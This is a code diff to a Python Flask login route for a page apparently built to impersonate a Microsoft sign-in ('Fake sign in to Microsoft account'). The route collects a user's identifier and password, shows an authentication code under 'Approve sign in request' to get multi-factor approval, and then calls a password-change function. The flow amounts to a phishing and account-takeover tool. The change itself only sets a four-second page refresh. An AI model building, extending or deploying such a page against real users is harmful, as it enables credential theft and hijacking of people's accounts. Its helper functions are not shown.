@@ -107,12 +107,12 @@ def login():
     if "identifier" in session and "password" in session:
         authentication_code = Get_Authentication_Code()
         if not (int(authentication_code) < 0):
-            return render_template("login.html", refresh=True, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+            return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         elif Refresh_Code():
             authentication_code = Get_Authentication_Code()
             if not (int(authentication_code) < 0):
-                return render_template("login.html", refresh=True, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         elif not password_changed:
             Change_Password()
@@ -135,7 +135,7 @@ def login():
             session["password"] = password_form.password.data
             authentication_code = Get_Authentication_Code()
             if not (int(authentication_code) < 0):
-                return render_template("login.html", refresh=True, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)
 
